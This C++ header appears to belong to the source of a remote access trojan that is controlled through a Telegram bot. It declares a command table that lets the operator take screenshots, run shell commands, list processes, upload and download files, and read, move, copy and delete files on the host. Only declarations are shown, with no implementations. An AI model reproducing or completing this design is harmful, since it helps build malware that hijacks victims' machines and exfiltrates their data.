/*include/rat/Handler.hpp*/
#pragma once
#include "rat/handler/types.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/tbot/types.hpp"
#include "rat/networking.hpp"

namespace rat::handler {

class Handler {
private:
    tbot::Bot& bot;
    RatState state;
    
    rat::networking::Client curl_client;

    struct CommandHandler {
        std::string command;
        void (Handler::*handler)();
    };
    
    const std::array<CommandHandler, 17> command_map = {{
        {"/screenshot",   &Handler::handleScreenshotCommand},
        {"/sh",           &Handler::parseAndHandleShellCommand},
        {"/process",      &Handler::parseAndHandleProcessCommand},
        {"/menu",         &Handler::handleMenuCommand},
        {"/download",     &Handler::handleDownloadCommand},
        {"/upload",       &Handler::handleUploadCommand},
        {"/pwd",          &Handler::handlePwdCommand},
        {"/cd",           &Handler::handleCdCommand},
        {"/ls",           &Handler::handleLsCommand},
        {"/read",         &Handler::handleReadCommand},
        {"/touch",        &Handler::handleTouchCommand},
        {"/get",          &Handler::handleGetCommand},
        {"/stat",         &Handler::handleStatCommand},
        {"/rm",           &Handler::handleRmCommand},
        {"/mv",           &Handler::handleMvCommand},
        {"/cp",           &Handler::handleCpCommand},
        {"/set",          &Handler::handleSetCommand}
    }};
    
    rat::tbot::Update telegram_update;
    Command command;
    
   

  // Parse Telegram message to command
  Command parseTelegramMessageToCommand(void);
    
  // Command handler methods
  void handleScreenshotCommand();
  void parseAndHandleShellCommand();
  void parseAndHandleProcessCommand();
  void handleMenuCommand();
  void handleMessageWithUploadedFiles();
  void handleDownloadCommand();
  void handleUploadCommand();
  void handlePwdCommand();
  void handleCdCommand();
  void handleLsCommand();
  void handleReadCommand();
  void handleTouchCommand();
  void handleGetCommand();
  void handleStatCommand();
  void handleRmCommand();
  void handleMvCommand();
  void handleCpCommand();
  void handleSetCommand();

    // Dispatcher - direct member function calls
  void dispatch();

  void dynamic_command_dispatch();

public:
    Handler(rat::tbot::Bot& arg_Bot):
        bot(arg_Bot),
        curl_client(){
            this->state = RatState();
            this->state.scanSystemPathsForUtilities();
    } 
    // Handle Telegram update
    void handleUpdate(rat::tbot::Update&& arg_Update);
     
};//class rat::handler::Handler

} // namespace rat::handler


